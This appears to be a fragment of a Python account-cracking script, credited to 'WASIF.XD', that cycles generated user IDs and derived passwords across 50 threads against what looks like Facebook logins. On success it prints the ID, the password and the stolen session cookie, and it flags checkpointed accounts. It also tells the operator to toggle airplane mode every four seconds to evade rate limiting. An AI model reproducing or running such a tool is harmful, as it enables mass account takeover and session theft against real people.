...
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mWASIF.XD\33[0;m\033[1;32m && \033[1;33mXD\33[0;m
...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 SECOND ')
        print('\033[1;32m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(XD-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(XD-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
